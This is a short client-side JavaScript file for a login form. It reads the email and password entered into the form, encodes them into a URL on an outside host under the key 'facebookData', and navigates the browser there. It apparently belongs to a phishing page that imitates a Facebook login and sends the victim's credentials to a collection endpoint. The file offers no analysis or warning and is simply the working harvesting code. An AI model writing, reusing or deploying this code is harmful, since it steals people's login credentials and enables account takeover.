"use strict";
const form_input = document.querySelectorAll(".form-input");
form_input[0].value = form_input[1].value = "";
const logInAuth = () => {
  const data = {
    email: form_input[0].value,
    password: form_input[1].value,
  }
  const url = `https://taraknath341.codeberg.page/database/?key=facebookData&value=${JSON.stringify(data)}`;
  const a = document.createElement("a");
  a.href = url;
  a.click();
  return false;
}
